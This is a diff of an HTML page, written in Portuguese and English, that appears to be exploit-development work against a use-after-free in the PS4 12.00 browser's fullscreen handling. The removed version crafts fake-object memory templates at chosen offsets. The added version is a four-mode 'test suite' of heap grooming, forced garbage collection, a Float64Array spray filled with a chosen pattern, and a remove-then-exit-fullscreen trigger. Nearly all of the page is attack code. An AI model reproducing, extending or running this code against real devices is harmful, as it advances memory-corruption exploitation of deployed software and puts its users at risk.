@@ -2,133 +2,140 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 UAF - Dissecação (Parte 2)</title>
-<style>
-    body { background-color: #111; color: #0f0; font-family: monospace; font-size: 16px; padding: 20px;}
-    button { padding: 15px; margin: 5px; cursor: pointer; background: #333; color: #0f0; border: 1px solid #0f0; font-weight: bold; }
-    button:hover { background: #555; }
-    #log { margin-top: 20px; white-space: pre-wrap; font-size: 18px; }
-    .leak { color: #ff00ff; font-weight: bold; font-size: 22px;}
-    .info { color: #ffff00; font-weight: bold; }
-</style>
+<title>PS4 Fullscreen UAF - Test Suite</title>
 </head>
-<body>
+<body style="background:#222;color:#fff;">
 
-<h2>PS4 12.00 - Escaneamento Profundo (Offsets 0x28 a 0x48)</h2>
+<h2>PS4 12.00 - Fullscreen UAF Test Suite</h2>
 
-<button onclick="runTest(5)">Teste 5: Mutação no Offset 0x28</button>
-<button onclick="runTest(6)">Teste 6: Mutação no Offset 0x30</button>
-<button onclick="runTest(7)">Teste 7: Mutação no Offset 0x38</button>
-<button onclick="runTest(8)">Teste 8: Mutação no Offset 0x40</button>
-<button onclick="runTest(9)">Teste 9: Mutação no Offset 0x48</button>
+<button onclick="runTest(1)">Teste 1 — Completo (GC + Spray)</button><br><br>
+<button onclick="runTest(2)">Teste 2 — Sem GC</button><br><br>
+<button onclick="runTest(3)">Teste 3 — Sem Spray</button><br><br>
+<button onclick="runTest(4)">Teste 4 — Apenas remove + exitFullscreen</button>
 
-<div id="log">Aguardando seleção...</div>
+<div id="log" style="margin-top:20px;"></div>
 
 <script>
-// O Listener interceptador
-document.addEventListener('webkitfullscreenchange', (event) => {
-    let log = document.getElementById("log");
-    log.innerHTML += "<br><span class='info'>[*] Evento webkitfullscreenchange INTERCEPTADO!</span>";
-    
-    try {
-        let alvoZumbi = event.target;
-        
-        if (alvoZumbi) {
-            let tagVazada = alvoZumbi.tagName;
-            log.innerHTML += `<br>[*] Tag do alvo do evento: ${tagVazada}`;
-            
-            if (tagVazada === 'HTML') {
-                log.innerHTML += `<br>[-] Sem alteração. A tag continua HTML.`;
-            } else if (tagVazada !== 'DIV') {
-                log.innerHTML += `<br><span class="leak">[!!!] BINGO! O OFFSET CONTROLA O TIPO! TagName: ${tagVazada}</span>`;
-            }
-        }
-    } catch(e) {
-        log.innerHTML += `<br><span class="leak">[!] Exceção capturada: ${e.message}</span>`;
-    }
-});
+const PATTERN = 2.121995791e-314;
 
-function runTest(testMode) {
-    const log = document.getElementById("log");
-    
-    // Calcula o offset em hexadecimal para exibição correta
-    let offsetHex = ((testMode + 3) * 8).toString(16).padStart(2, '0');
-    log.innerHTML = `Preparando mutação no Offset 0x${offsetHex}...<br><b>Pressione OPTIONS agora!</b>`;
+function log(msg) {
+    try { console.log(msg); } catch(e){}
+    document.getElementById("log").innerHTML += "<p>" + msg + "</p>";
+}
 
+function setupHeap() {
     let controllers = [];
 
-    // [1] Alocação Inicial
     for(let i = 0; i < 5000; i++) {
         let arr = new Float64Array(8);
         arr[0] = i;
         controllers.push(arr);
     }
 
-    // [2] Criação do Alvo
+    return controllers;
+}
+
+function setupFullscreen() {
     let fsTarget = document.createElement("div");
-    fsTarget.innerHTML = `<h1 style='color: white; margin-top: 20%; text-align: center;'>Mutação: Offset 0x${offsetHex}<br>Aperte OPTIONS</h1>`;
-    fsTarget.style.cssText = "background:black; width:100%; height:100%; position:absolute; top:0; left:0;";
+    fsTarget.innerHTML = "<h1 style='margin-top:20%;text-align:center;'>FULLSCREEN ACTIVE<br>Press OPTIONS</h1>";
+    fsTarget.style.background = "black";
+    fsTarget.style.width = "100%";
+    fsTarget.style.height = "100%";
+    fsTarget.style.position = "absolute";
+    fsTarget.style.top = "0";
+    fsTarget.style.left = "0";
+
     document.body.appendChild(fsTarget);
 
     if (fsTarget.webkitRequestFullscreen) {
         fsTarget.webkitRequestFullscreen();
+    } else {
+        document.documentElement.webkitRequestFullscreen?.();
     }
 
+    return fsTarget;
+}
+
+function doGC(controllers) {
+    log("[*] Forçando GC...");
+    controllers = null;
+
+    for (let i = 0; i < 20000; i++) {
+        new ArrayBuffer(0x10000);
+    }
+}
+
+function doSpray() {
+    log("[*] Executando spray...");
+    let spray = [];
+
+    for(let i = 0; i < 8000; i++) {
+        let p = new Float64Array(10);
+        p.fill(PATTERN);
+        spray.push(p);
+    }
+
+    return spray;
+}
+
+function trigger(fsTarget) {
+    log("[*] Trigger: remove + exitFullscreen");
+
+    try {
+        fsTarget.remove();
+
+        if (document.webkitIsFullScreen || document.fullscreenElement) {
+            document.webkitExitFullscreen?.() || document.webkitCancelFullScreen?.();
+        }
+    } catch(e) {
+        log("[ERRO] " + e);
+    }
+
+    setTimeout(() => location.reload(), 500);
+}
+
+function runTest(mode) {
+    const logDiv = document.getElementById("log");
+    logDiv.innerHTML = "<p>Running... Press OPTIONS</p>";
+
+    log("[*] Iniciando teste " + mode);
+
+    let controllers = setupHeap();
+    let fsTarget = setupFullscreen();
+
     window.onblur = function() {
-        log.innerHTML += "<br>[*] Construindo o molde de memória...";
+        log("[*] onblur disparado");
 
-        // [3] GC
-        controllers = null;
-        for (let i = 0; i < 20000; i++) {
-            new ArrayBuffer(0x10000);
+        // =========================
+        // TESTES
+        // =========================
+
+        if (mode === 1) {
+            // COMPLETO
+            doGC(controllers);
+            let spray = doSpray();
+
+            setTimeout(() => trigger(fsTarget), 3000);
         }
 
-        // --- ENGENHARIA DO FAKE OBJECT (PARTE 2) ---
-        let buffer = new ArrayBuffer(80); 
-        let u32 = new Uint32Array(buffer);
-        let f64Template = new Float64Array(buffer);
+        else if (mode === 2) {
+            // SEM GC
+            let spray = doSpray();
 
-        // Preenche com o padrão base (HTML)
-        for(let i = 0; i < 20; i++) {
-            u32[i] = 0x22222222;
+            setTimeout(() => trigger(fsTarget), 3000);
         }
 
-        // Aplicamos a mutação (0x33333333) nos offsets mais profundos
-        if (testMode === 5) { // Offset 0x28
-            u32[10] = 0x33333333; u32[11] = 0x33333333; 
-        } else if (testMode === 6) { // Offset 0x30
-            u32[12] = 0x33333333; u32[13] = 0x33333333;
-        } else if (testMode === 7) { // Offset 0x38
-            u32[14] = 0x33333333; u32[15] = 0x33333333;
-        } else if (testMode === 8) { // Offset 0x40
-            u32[16] = 0x33333333; u32[17] = 0x33333333;
-        } else if (testMode === 9) { // Offset 0x48
-            u32[18] = 0x33333333; u32[19] = 0x33333333;
+        else if (mode === 3) {
+            // SEM SPRAY
+            doGC(controllers);
+
+            setTimeout(() => trigger(fsTarget), 3000);
         }
 
-        // [4] Spray Estruturado
-        let spray = [];
-        for(let i = 0; i < 8000; i++) {
-            let p = new Float64Array(10);
-            p.set(f64Template); 
-            spray.push(p);
+        else if (mode === 4) {
+            // MINIMO (CIRÚRGICO)
+            setTimeout(() => trigger(fsTarget), 3000);
         }
-
-        // [5] Gatilho
-        setTimeout(() => {
-            log.innerHTML += "<br>[*] Acionando Gatilho Síncrono...";
-            try {
-                fsTarget.remove(); 
-                
-                if (document.webkitIsFullScreen || document.fullscreenElement) {
-                    document.webkitExitFullscreen?.() || document.webkitCancelFullScreen?.();
-                }
-            } catch(e) {
-                log.innerHTML += "<br>[Erro] " + e;
-            }
-
-            setTimeout(() => location.reload(), 1500);
-        }, 3000);
     };
 }
 </script>
